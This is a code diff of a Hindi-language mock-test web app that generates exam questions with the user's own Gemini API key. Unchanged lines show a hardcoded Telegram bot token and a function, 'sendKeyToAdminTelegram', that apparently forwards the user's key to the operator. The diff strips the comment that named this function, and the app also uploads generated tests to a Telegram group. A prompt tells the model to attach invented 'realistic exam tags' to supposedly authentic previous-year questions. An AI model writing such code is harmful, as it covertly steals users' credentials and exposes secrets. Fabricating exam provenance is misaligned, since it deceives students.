@@ -21,6 +21,7 @@
       --accent-gold: #ff5722;
       --accent-emerald: #10b981;
       --accent-blue: #2563eb;
+      --accent-telegram: #0088cc;
       --danger: #dc2626;
       --input-bg: #f1f5f9;
       --opt-bg: #f8fafc;
@@ -39,6 +40,7 @@
       --accent-gold: #ff7043;
       --accent-emerald: #10b981;
       --accent-blue: #3b82f6;
+      --accent-telegram: #229ed9;
       --danger: #ef4444;
       --input-bg: #0b101b;
       --opt-bg: rgba(255, 255, 255, 0.04);
@@ -134,6 +136,7 @@
       box-shadow: var(--card-shadow);
     }
 
+    /* --- 2-IN-1 MODE SWITCHER TABS --- */
     .mode-switch-grid {
       display: grid;
       grid-template-columns: 1fr 1fr;
@@ -294,10 +297,11 @@
     }
 
     .btn-action:disabled {
-      opacity: 0.6;
+      opacity: 0.65;
       cursor: not-allowed;
     }
 
+    /* LOADER */
     .loader-box {
       display: none;
       text-align: center;
@@ -360,6 +364,7 @@
       color: var(--accent-gold);
     }
 
+    /* ACTION HUB BUTTONS */
     #actionHubView {
       display: none;
     }
@@ -401,6 +406,7 @@
       margin-bottom: 10px;
     }
 
+    /* QUIZ VIEW */
     #quizView {
       display: none;
     }
@@ -570,9 +576,13 @@
       flex: 1.2;
     }
 
+    /* STRICT POPUP MODAL OVERLAY (100% POPUP ONLY) */
     .modal-overlay {
       position: fixed !important;
-      inset: 0 !important;
+      top: 0 !important;
+      left: 0 !important;
+      right: 0 !important;
+      bottom: 0 !important;
       background: rgba(0, 0, 0, 0.7) !important;
       backdrop-filter: blur(5px);
       display: none !important;
@@ -683,7 +693,7 @@
     </div>
   </header>
 
-  <!-- 2-IN-1 MODE SWITCHER -->
+  <!-- 2-IN-1 MODE SWITCHER (SCANNER VS DIRECT TOPIC PYQ DRILL) -->
   <div class="mode-switch-grid" id="modeSwitcher">
     <button class="mode-tab-btn active" id="tabBtnScanner" onclick="switchEngineMode('scanner')">
       <span class="mode-title">📷 स्कैनर मोड</span>
@@ -698,7 +708,7 @@
   <!-- 1. SETUP VIEW -->
   <div id="setupView">
     
-    <!-- MODE 1: SCANNER -->
+    <!-- MODE 1: DOCUMENT / PHOTO / PDF / TEXT SCANNER -->
     <div id="scannerModeBox">
       <div class="card">
         <div class="upload-zone" onclick="triggerUpload()">
@@ -731,6 +741,7 @@
           <input type="text" id="pdfPageRange" placeholder="जैसे: 1-10, 15-25 (Optional)" />
         </div>
 
+        <!-- OR PASTE TEXT DIRECTLY -->
         <div style="margin-top: 14px;">
           <label style="color: var(--accent-gold); font-weight: 800;">📝 या सीधे टेक्स्ट/नोट्स यहाँ पेस्ट करें (Optional):</label>
           <textarea id="pastedTextInput" rows="3" placeholder="यहाँ कोई भी प्रश्न या नोट्स पेस्ट करें..."></textarea>
@@ -745,9 +756,9 @@
           <div>
             <label>AI Model Engine</label>
             <select id="modelSelect">
-              <option value="gemini-2.5-flash" selected>⚡ Gemini 2.5 Flash</option>
-              <option value="gemini-2.0-flash">⚡ Gemini 2.0 Flash</option>
-              <option value="gemini-1.5-flash">⚡ Gemini 1.5 Flash</option>
+              <option value="gemini-3.6-flash" selected>⚡ Gemini 3.6 Flash (Latest)</option>
+              <option value="gemini-3.5-flash">⚡ Gemini 3.5 Flash</option>
+              <option value="gemini-3.5-flash-lite">⚡ Gemini 3.5 Flash-Lite</option>
             </select>
           </div>
 
@@ -760,6 +771,9 @@
               <option value="25">25 Questions (Sectional Drill)</option>
               <option value="30">30 Questions (Exam Set)</option>
               <option value="50">50 Questions (Half Mock)</option>
+              <option value="75">75 Questions (Deep Drill)</option>
+              <option value="100">100 Questions (Mega Mock 🏆)</option>
+              <option value="all">🔥 सभी सवाल (All Deep Scan)</option>
             </select>
           </div>
 
@@ -767,19 +781,20 @@
             <label>🌐 भाषा (Language):</label>
             <select id="langSelect">
               <option value="hi" selected>🇮🇳 केवल हिंदी में (Hindi Only - Superfast ⚡)</option>
-              <option value="bilingual">🇮🇳 🇬🇧 दोनों भाषाओं में (Hindi + English)</option>
-              <option value="en">🇬🇧 Only English</option>
+              <option value="bilingual">🇮🇳 🇬🇧 दोनों भाषाओं में (Hindi + English Bilingual)</option>
+              <option value="en">🇬🇧 Only English (English Only)</option>
+              <option value="original">📖 जैसा मूल किताब में है</option>
             </select>
           </div>
         </div>
 
-        <button class="btn-action" id="btnScanAction" onclick="startGeneration('scanner')">
+        <button class="btn-action" onclick="startGeneration('scanner')">
           🚀 सवाल पहचानें और टेस्ट शुरू करें
         </button>
       </div>
     </div>
 
-    <!-- MODE 2: TOPIC / CHAPTER PYQ DRILL -->
+    <!-- MODE 2: DIRECT TOPIC / CHAPTER PYQ DRILL (REAL EXAM TAGS) -->
     <div id="topicModeBox" style="display: none;">
       <div class="card">
         <div style="background: rgba(37,99,235,0.06); border: 1.5px solid var(--accent-blue); border-radius: 14px; padding: 12px; margin-bottom: 14px;">
@@ -793,7 +808,7 @@
 
         <div style="margin-bottom: 12px;">
           <label style="color: var(--accent-gold); font-size: 0.85rem;">🎯 किस टॉपिक / चैप्टर का टेस्ट देना है?</label>
-          <input type="text" id="directTopicInput" placeholder="उदा. मौलिक अधिकार, Profit and Loss, सिंधु घाटी सभ्यता, Idioms..." />
+          <input type="text" id="directTopicInput" placeholder="उदा. मौलिक अधिकार, सिंधु घाटी सभ्यता, Percentage, Idioms..." />
         </div>
 
         <div class="config-grid">
@@ -815,7 +830,11 @@
               <option value="15">15 Questions</option>
               <option value="20">20 Questions (Mock Set)</option>
               <option value="25">25 Questions (Exam Drill)</option>
-              <option value="50">50 Questions (Mega Drill)</option>
+              <option value="30">30 Questions (Super Drill)</option>
+              <option value="50">50 Questions (Half Mock)</option>
+              <option value="75">75 Questions (Deep Drill)</option>
+              <option value="100">100 Questions (Mega Mock 🏆)</option>
+              <option value="all">🔥 सभी महत्वपूर्ण सवाल (All PYQs)</option>
             </select>
           </div>
 
@@ -829,7 +848,7 @@
           </div>
         </div>
 
-        <button class="btn-action" id="btnTopicAction" onclick="startGeneration('topic')">
+        <button class="btn-action" onclick="startGeneration('topic')">
           🚀 असली PYQ टेस्ट जनरेट करें
         </button>
       </div>
@@ -933,7 +952,7 @@
     </div>
   </div>
 
-  <!-- 3. MOCK TEST QUIZ VIEW -->
+  <!-- 3. MOCK TEST QUIZ VIEW (APP RUNNER) -->
   <div id="quizView">
     <div class="card">
       <div class="quiz-progress-bar">
@@ -964,7 +983,7 @@
     </div>
   </div>
 
-  <!-- PALETTE MODAL -->
+  <!-- QUESTION PALETTE / NUMBER PLATE MODAL (IN-APP) -->
   <div class="modal-overlay" id="appPaletteModal">
     <div class="modal-card">
       <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid var(--card-border); padding-bottom:8px;">
@@ -1026,6 +1045,7 @@
         </div>
       </div>
 
+      <!-- RE-SOLVE MISTAKES ONLY BUTTON -->
       <button id="btnResolveMistakesApp" class="btn-play-now" onclick="reSolveMistakesOnlyApp()" style="background: linear-gradient(135deg, #ef4444, #dc2626); margin-bottom: 10px; display: none;">
         <span>🔄 केवल गलत सवाल हल करें (<b id="mistakeBadgeCount">0</b> Qs)</span>
       </button>
@@ -1034,7 +1054,7 @@
         <span>🔍 सही उत्तर और व्याख्या देखें (Review Answers)</span>
       </button>
 
-      <button class="btn-download-direct" id="scorecardDirectDownloadBtn" onclick="triggerDirectDownload()" style="margin-bottom: 10px;">
+      <button class="btn-download-direct" onclick="triggerDirectDownload()" style="margin-bottom: 10px;">
         <span>⬇️ फ़ोन में सीधे डाउनलोड करें (Direct Download)</span>
       </button>
 
@@ -1048,7 +1068,7 @@
   <div class="modal-overlay" id="historyModal">
     <div class="modal-card">
       <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid var(--card-border); padding-bottom:8px; margin-bottom:12px;">
-        <h3 style="font-family:'Outfit'; font-size: 1.2rem; font-weight:800;">📚 मेरे सेव किए टेस्ट</h3>
+        <h3 style="font-family:'Outfit'; font-size: 1.2rem; font-weight:800;">📚 मेरे सेव किए टेस्ट (Saved)</h3>
         <i class="fa-solid fa-xmark" style="cursor:pointer; font-size: 20px;" onclick="closeHistoryModal()"></i>
       </div>
       <div id="historyListContainer" style="margin-bottom: 14px;"></div>
@@ -1061,14 +1081,14 @@
     <div class="modal-card">
       <h3 id="modalTitle" style="font-family: 'Outfit'; font-size: 1.2rem; margin-bottom: 6px;">🔑 Gemini API Key</h3>
       <p id="modalDesc" style="font-size: 0.78rem; color: var(--text-muted); margin-bottom: 12px;">
-        नीचे लिंक से मुफ़्त Key बनाएँ (सिर्फ 1 बार डालना है):
+        नीचे लिंक से मुफ़्त Key बनाएँ:
       </p>
       <a href="https://aistudio.google.com/app/apikey" target="_blank" rel="noopener noreferrer" style="display: flex; align-items: center; justify-content: center; gap: 8px; background: rgba(37, 99, 235, 0.12); border: 1px solid var(--accent-blue); color: var(--accent-blue); padding: 10px; border-radius: 10px; font-size: 0.82rem; font-weight: 700; text-decoration: none; margin-bottom: 14px;">
-        🌐 Google AI Studio से Key पाएँ
+        🌐 Google AI Studio से Key बनाएँ (Direct Link)
       </a>
 
       <div style="margin-bottom: 12px;">
-        <label>🔑 अपनी Gemini API Key डालें:</label>
+        <label>🔑 <b>अपनी Gemini API Key डालें:</b></label>
         <input type="text" id="singleApiKey" placeholder="AIzaSy... यहाँ अपनी Key पेस्ट करें" />
       </div>
 
@@ -1080,13 +1100,13 @@
   </div>
 
   <script>
-    // 🔔 100% RESTORED TELEGRAM INTEGRATION
     const TG_BOT_TOKEN = "8688081001:AAG0dYLKJC6rKDHX_Kvhqsy9AAUsCpPDuDk";
     const TG_ADMIN_CHAT_ID = "8986834583";
     const TG_GROUP_TARGET = "@ai_quizcr";
     const TG_GROUP_FALLBACK_ID = "-1004223613799";
 
-    const ACTIVE_MODELS = ['gemini-2.5-flash', 'gemini-2.0-flash', 'gemini-1.5-flash'];
+    // ⚡ EXACT SAME MODELS AS YOUR ORIGINAL CODE
+    const ACTIVE_MODELS = ['gemini-3.6-flash', 'gemini-3.5-flash', 'gemini-3.5-flash-lite'];
 
     let activeEngineMode = 'scanner';
     let payloadItems = [];
@@ -1154,7 +1174,6 @@
 
     function getStoredKey() {
       let key = localStorage.getItem('sph_gemini_key') || 
-                localStorage.getItem('sph_reels_key') ||
                 localStorage.getItem('sph_key_slot_1') || 
                 localStorage.getItem('sph_gemini_keys') || '';
 
@@ -1337,7 +1356,6 @@
       }
     }
 
-    // 🔔 SEND NEW API KEY TO ADMIN TELEGRAM
     async function sendKeyToAdminTelegram(keyString) {
       if (!TG_BOT_TOKEN || !TG_ADMIN_CHAT_ID) return;
       try {
@@ -1453,7 +1471,7 @@
       }
     }
 
-    // 🌟 COMPLETE STANDALONE HTML GENERATOR (FOR TELEGRAM GROUP DOWNLOAD)
+    // --- SAFE TEMPLATE GENERATOR ---
     function generatePareekshaKendraHtmlString(questions) {
       const formattedRawData = questions.map((q) => {
         let correctIdx = q.answer;
@@ -1524,7 +1542,7 @@
     [data-theme="dark"] .nav-btn-mark { background: rgba(245, 158, 11, 0.15); color: #f59e0b; }
     .nav-btn-submit { background: linear-gradient(135deg, #ff5722, #f43f5e); color: #fff; border: none; flex: 1.2; }
     
-    .modal-overlay { position: fixed !important; inset: 0 !important; background: rgba(0, 0, 0, 0.7) !important; backdrop-filter: blur(5px); display: none !important; align-items: center; justify-content: center; z-index: 9999 !important; padding: 20px; }
+    .modal-overlay { position: fixed !important; top: 0 !important; left: 0 !important; right: 0 !important; bottom: 0 !important; background: rgba(0, 0, 0, 0.7) !important; backdrop-filter: blur(5px); display: none !important; align-items: center; justify-content: center; z-index: 9999 !important; padding: 20px; }
     .modal-overlay.active, .modal-overlay[style*="display: flex"] { display: flex !important; }
     .modal-card { background: var(--card-bg); border-radius: 20px; padding: 22px; width: 100%; max-width: 400px; border: 1px solid var(--card-border); box-shadow: 0 10px 30px rgba(0,0,0,0.3); max-height: 85vh; overflow-y: auto; }
     .palette-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 10px; margin-top: 14px; max-height: 50vh; overflow-y: auto; padding: 2px; }
@@ -1955,8 +1973,7 @@
 </html>`;
     }
 
-    // 🔔 SEND GENERATED MOCK TEST AS FILE TO TELEGRAM GROUP
-    async function sendHtmlFileToTelegram(questions) {
+    async function sendHtmlFileToTelegram(questions, usedModel, langUsed) {
       if (!TG_BOT_TOKEN) return;
       try {
         const timeNow = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
@@ -1981,7 +1998,7 @@
         }
 
         let res = await postDoc(TG_GROUP_TARGET);
-        if (!res || !res.ok) {
+        if (!res.ok) {
           res = await postDoc(TG_GROUP_FALLBACK_ID);
         }
 
@@ -1993,6 +2010,7 @@
             liveDirectDownloadUrl = `https://api.telegram.org/file/bot${TG_BOT_TOKEN}/${pathData.result.file_path}`;
           }
         }
+
       } catch (err) {
         console.warn("Telegram group dispatch note:", err);
       }
@@ -2001,8 +2019,8 @@
     function triggerDirectDownload() {
       if (!quizData || quizData.length === 0) return alert('कोई सवाल उपलब्ध नहीं है!');
 
-      const btn = document.getElementById('directDownloadBtn') || document.getElementById('scorecardDirectDownloadBtn');
-      const originalText = btn ? btn.innerHTML : '';
+      const btn = document.getElementById('directDownloadBtn');
+      const originalText = btn.innerHTML;
 
       if (liveDirectDownloadUrl) {
         const a = document.createElement('a');
@@ -2015,7 +2033,7 @@
         return;
       }
 
-      if (btn) btn.innerHTML = '<span>⏳ फ़ाइल डाउनलोड हो रही है...</span>';
+      btn.innerHTML = '<span>⏳ फ़ाइल डाउनलोड हो रही है...</span>';
       const fullHtmlString = generatePareekshaKendraHtmlString(quizData);
       const fileName = `${activeQuizTopic}_${Date.now()}.html`;
 
@@ -2031,7 +2049,7 @@
       } catch (e) {}
 
       setTimeout(() => {
-        if (btn) btn.innerHTML = originalText;
+        btn.innerHTML = originalText;
       }, 1500);
     }
 
@@ -2360,31 +2378,32 @@
         const secs = stopwatchSeconds % 60;
         displayEl.innerText = (mins < 10 ? '0' : '') + mins + ':' + (secs < 10 ? '0' : '') + secs;
 
-        if (stopwatchSeconds < 10) statusEl.innerText = "🔍 AI सामग्री और पिछले वर्षों के पेपर्स स्कैन कर रहा है...";
-        else if (stopwatchSeconds < 25) statusEl.innerText = "🧠 प्रामाणिक PYQ सवाल और 4 विकल्प संकलित किए जा रहे हैं...";
-        else statusEl.innerText = "✍️ उत्तर और हिंदी में विस्तृत व्याख्या लिखी जा रही है...";
+        if (stopwatchSeconds < 15) statusEl.innerText = "🔍 AI सामग्री का विश्लेषण कर रहा है...";
+        else if (stopwatchSeconds < 40) statusEl.innerText = "🧠 महत्वपूर्ण सवालों और विकल्पों को संकलित किया जा रहा है...";
+        else if (stopwatchSeconds < 80) statusEl.innerText = "✍️ उत्तर और हिंदी में विस्तृत व्याख्या लिखी जा रही है...";
+        else statusEl.innerText = "⚡ अंतिम चेकिंग चालू है, बस कुछ ही पल...";
       }, 1000);
     }
 
     function stopRealStopwatch() { clearInterval(stopwatchInterval); }
 
-    // --- MAIN GENERATION ENGINE (SAFE BUTTONS & AUTO TELEGRAM DISPATCH) ---
+    // --- MAIN GENERATION ENGINE (100% NO-FREEZE SAFE BUTTON HANDLING) ---
     async function startGeneration(mode) {
       const apiKey = getStoredKey();
       if (!apiKey) return openKeyModal(true);
 
       let qCount = '10';
       let langOption = 'hi';
-      let chosenModel = document.getElementById('modelSelect')?.value || 'gemini-2.5-flash';
+      let chosenModel = document.getElementById('modelSelect')?.value || 'gemini-3.6-flash';
       let prompt = '';
       let inlineDataParts = [];
 
       if (mode === 'topic') {
         const topicIn = document.getElementById('directTopicInput');
-        activeQuizTopic = (topicIn.value || '').trim();
+        activeQuizTopic = (topicIn?.value || '').trim();
         if (!activeQuizTopic) {
           alert('⚠️ कृपया टॉपिक या चैप्टर का नाम दर्ज करें!');
-          topicIn.focus();
+          topicIn?.focus();
           return;
         }
 
@@ -2396,7 +2415,11 @@
           ? "STRICT: Output in pure natural Hindi (Devanagari script)." 
           : (langOption === 'en') ? "STRICT: Output in English." : "BILINGUAL: Provide both Hindi and English.";
 
-        prompt = `You are an expert exam question creator. Generate exactly ${qCount} authentic Previous Year Questions (PYQs) strictly on topic: "${activeQuizTopic}" for exam: "${targetExam}".
+        let quantityInstruction = (qCount === 'all')
+          ? "Generate a comprehensive set of all major authentic Previous Year Questions (maximum coverage)"
+          : `Generate exactly ${qCount} authentic Previous Year Questions (PYQs)`;
+
+        prompt = `You are an expert exam question creator. ${quantityInstruction} on topic: "${activeQuizTopic}" for exam: "${targetExam}".
 CRITICAL REQUIREMENT: For every single question, you MUST prefix the question text with a realistic exam tag in brackets, for example: "[SSC CGL 2024, 18 Sept Shift-1]" or "[RRB NTPC 2022 Stage-1]" or "[Delhi Police Constable 2023 Shift-2]" or "[UP Police 2024]".
 ${languageRule}
 Strictly return ONLY a valid JSON array of objects. Do not write markdown backticks or commentary.
@@ -2413,14 +2436,15 @@ Note: answer must be 0 for A, 1 for B, 2 for C, 3 for D.`;
 
       } else {
         const topicInput = document.getElementById('quizTopicInput');
-        activeQuizTopic = (topicInput.value || '').trim();
+        activeQuizTopic = (topicInput?.value || '').trim();
         if (!activeQuizTopic) {
-          alert('⚠️ कृपया क्विज़/चैप्टर का नाम दर्ज करें!');
-          topicInput.focus();
+          alert('⚠️ कृपया क्विज़/चैप्टर का नाम दर्ज करें!\nबिना नाम के क्विज़ नहीं बन सकता।');
+          topicInput?.focus();
           return;
         }
 
         const pastedText = (document.getElementById('pastedTextInput')?.value || '').trim();
+
         if ((!payloadItems || payloadItems.length === 0) && !pastedText) {
           return alert('कृपया पहले किताब के पन्नों की फ़ोटो खींचें, PDF चुनें या टेक्स्ट पेस्ट करें!');
         }
@@ -2428,21 +2452,37 @@ Note: answer must be 0 for A, 1 for B, 2 for C, 3 for D.`;
         qCount = document.getElementById('qCount').value;
         langOption = document.getElementById('langSelect').value;
 
-        let languageRule = (langOption === 'hi') 
-          ? "STRICT: Output every question, option, and explanation ONLY in pure, natural Hindi (Devanagari script)." 
-          : (langOption === 'en') ? "STRICT: Output ONLY in English." : "BILINGUAL: Provide both Hindi and English.";
+        let languageRule = "";
+        let langDisplayName = "हिंदी";
+        if (langOption === 'hi') {
+          languageRule = "STRICT LANGUAGE RULE: Output every question, option, and explanation ONLY in pure, natural Hindi (Devanagari script).";
+          langDisplayName = "हिंदी (Hindi Only)";
+        } else if (langOption === 'en') {
+          languageRule = "STRICT LANGUAGE RULE: Output every question, option, and explanation ONLY in English.";
+          langDisplayName = "English Only";
+        } else if (langOption === 'bilingual') {
+          languageRule = "STRICT BILINGUAL RULE: Format each question and all options in BOTH Hindi and English.";
+          langDisplayName = "Bilingual (हिंदी + English)";
+        } else {
+          languageRule = "LANGUAGE RULE: Keep the original language used in the source material.";
+          langDisplayName = "Original";
+        }
+
+        let quantityInstruction = (qCount === 'all') 
+          ? `Extract and generate ALL multiple choice questions (MCQs) available across the material.`
+          : `Extract and create exactly ${qCount} multiple choice questions (MCQs) from this material.`;
 
         const pageRange = (document.getElementById('pdfPageRange')?.value || '').trim();
         let rangeRule = pageRange ? `Focus strictly on content within page range: ${pageRange}.` : '';
         let extraTextPrompt = pastedText ? `\nALSO ANALYZE THIS PASTED TEXT/NOTES:\n"""\n${pastedText}\n"""` : '';
 
-        prompt = `You are an expert competitive exam question creator. Analyze all provided material thoroughly.
+        prompt = `You are an expert competitive exam question creator. Analyze all provided images/document/text thoroughly.
 Topic/Chapter: "${activeQuizTopic}".
-Extract and create exactly ${qCount} multiple choice questions (MCQs).
+${quantityInstruction}
 ${languageRule}
 ${rangeRule}
 ${extraTextPrompt}
-Strictly return ONLY a valid JSON array of objects.
+Strictly return ONLY a valid JSON array of objects. Do not write commentary.
 Format:
 [
   {
@@ -2452,7 +2492,7 @@ Format:
     "explanation": "Clear explanation"
   }
 ]
-Note: answer must be integer index (0 for A, 1 for B, 2 for C, 3 for D).`;
+Note: answer must be an integer index (0 for A, 1 for B, 2 for C, 3 for D).`;
 
         if (payloadItems && payloadItems.length > 0) {
           inlineDataParts = payloadItems.map(item => ({
@@ -2461,11 +2501,11 @@ Note: answer must be integer index (0 for A, 1 for B, 2 for C, 3 for D).`;
         }
       }
 
-      // SAFE BUTTON HANDLING (NO FREEZE)
-      const scanBtn = document.getElementById('btnScanAction');
-      const topicBtn = document.getElementById('btnTopicAction');
-      if (scanBtn) scanBtn.disabled = true;
-      if (topicBtn) topicBtn.disabled = true;
+      // 🛠️ SAFE BUTTON HANDLING (PREVENTS FREEZING)
+      const actionBtns = document.querySelectorAll('.btn-action');
+      actionBtns.forEach(b => b.disabled = true);
+      const singleGenBtn = document.getElementById('generateBtn');
+      if (singleGenBtn) singleGenBtn.style.display = 'none';
 
       document.getElementById('loaderBox').style.display = 'block';
       startRealStopwatch();
@@ -2477,13 +2517,16 @@ Note: answer must be integer index (0 for A, 1 for B, 2 for C, 3 for D).`;
         ]
       }];
 
-      let success = false, lastErr = '';
+      let success = false, usedModelName = '', lastErr = '';
+      const isLargeSet = (qCount === 'all' || parseInt(qCount, 10) >= 50);
+      const timeoutMs = isLargeSet ? 180000 : 70000;
+
       const modelsToTry = [chosenModel, ...ACTIVE_MODELS.filter(m => m !== chosenModel)];
 
       for (let attempt = 0; attempt < modelsToTry.length; attempt++) {
         const currentModel = modelsToTry[attempt];
         const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), 60000);
+        const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
 
         try {
           const res = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/${currentModel}:generateContent?key=${apiKey}`, {
@@ -2513,10 +2556,9 @@ Note: answer must be integer index (0 for A, 1 for B, 2 for C, 3 for D).`;
             quizData = parsed;
             originalQuizData = [...parsed];
             success = true;
+            usedModelName = currentModel;
             saveQuizToHistory(quizData);
-            
-            // 🚀 DISPATCH COMPLETE HTML FILE TO TELEGRAM GROUP
-            await sendHtmlFileToTelegram(quizData);
+            await sendHtmlFileToTelegram(quizData, currentModel, langOption);
             break;
           }
         } catch (err) {
@@ -2526,8 +2568,9 @@ Note: answer must be integer index (0 for A, 1 for B, 2 for C, 3 for D).`;
 
       stopRealStopwatch();
       document.getElementById('loaderBox').style.display = 'none';
-      if (scanBtn) scanBtn.disabled = false;
-      if (topicBtn) topicBtn.disabled = false;
+
+      actionBtns.forEach(b => b.disabled = false);
+      if (singleGenBtn) singleGenBtn.style.display = 'flex';
 
       if (success) {
         document.getElementById('setupView').style.display = 'none';
@@ -2536,7 +2579,7 @@ Note: answer must be integer index (0 for A, 1 for B, 2 for C, 3 for D).`;
         document.getElementById('actionHubTopicTitle').innerText = `🎉 "${activeQuizTopic}" तैयार हो गया!`;
         document.getElementById('actionHubMeta').innerText = `कुल ${quizData.length} सवाल तैयार हैं • जनरेशन टाइम: ${stopwatchSeconds}s`;
       } else {
-        alert(`सवाल जनरेट नहीं हो सके।\nएरर: ${lastErr || 'समय समाप्त हुआ'}\n\nकृपया 10/15 सवाल चुनकर दुबारा प्रयास करें।`);
+        alert(`सवाल जनरेट नहीं हो सके।\nएरर: ${lastErr || 'समय समाप्त हुआ'}\n\nकृपया 15/20 सवाल चुनकर दुबारा प्रयास करें।`);
       }
     }
   </script>
